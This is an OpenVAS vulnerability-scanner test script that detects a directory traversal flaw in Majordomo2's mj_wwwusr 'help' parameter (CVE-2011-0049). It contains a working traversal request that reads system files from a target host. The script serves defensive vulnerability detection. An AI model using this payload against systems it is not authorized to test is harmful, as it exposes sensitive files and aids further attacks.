###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_majordomo2_dir_trav_vuln.nasl 13543 2019-02-08 14:43:51Z cfischer $
#
# Majordomo2 Directory Traversal Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801838");
  script_version("$Revision: 13543 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-08 15:43:51 +0100 (Fri, 08 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-02-07 15:21:16 +0100 (Mon, 07 Feb 2011)");
  script_bugtraq_id(46127);
  script_cve_id("CVE-2011-0049", "CVE-2011-0063");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Majordomo2 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisory/View/1");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16103/");
  script_xref(name:"URL", value:"https://bugzilla.mozilla.org/show_bug.cgi?id=628064");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive information
  that could aid in further attacks.");
  script_tag(name:"affected", value:"Majordomo2 Build 20110203 and prior");
  script_tag(name:"insight", value:"The flaw is caused by improper validation of user-supplied input via the
  'help' parameter in 'mj_wwwusr', which allows attacker to read arbitrary
  files via directory traversal attacks.");
  script_tag(name:"solution", value:"Upgrade to Majordomo2 Build 20110204 or later.");
  script_tag(name:"summary", value:"The host is running Majordomo2 and is prone to directory traversal
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.mj2.org/");
  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

files = traversal_files();

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  req = http_get( item:dir + "/mj_wwwusr", port:port );
  res = http_keepalive_send_recv( port:port,data:req );

  if( '>Majordomo' >< res ) {

    foreach file( keys( files ) ) {

      url = dir + "/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../" +
                  "../../../../../../" + files[file];

      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
        report = report_vuln_url( port:port, url:url );
        security_message( port:port, data:report );
        exit( 0 );
      }
    }
  }
}

exit( 99 );